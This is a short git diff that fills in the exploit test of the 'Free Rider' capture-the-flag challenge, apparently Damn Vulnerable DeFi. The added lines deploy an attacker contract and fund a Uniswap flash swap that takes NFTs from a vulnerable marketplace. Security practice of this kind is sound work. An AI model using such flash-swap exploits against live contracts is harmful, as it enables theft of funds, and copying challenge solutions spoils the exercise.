@@ -105,6 +105,20 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // deploy attacker contract
+        this.attackerContract = await (await ethers.getContractFactory('FlashSwapAttacker', attacker)).deploy(
+            [0, 1, 2, 3, 4, 5],
+            this.buyerContract.address,
+            this.nft.address,
+            this.marketplace.address,
+            this.uniswapFactory.address,
+            this.token.address,
+            this.weth.address
+        );
+
+        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('0.3')})
+        await this.weth.connect(attacker).approve(this.attackerContract.address, UNISWAP_INITIAL_WETH_RESERVE)
+        await this.attackerContract.connect(attacker).flashSwap(ethers.utils.parseEther('90'))
     });
 
     after(async function () {
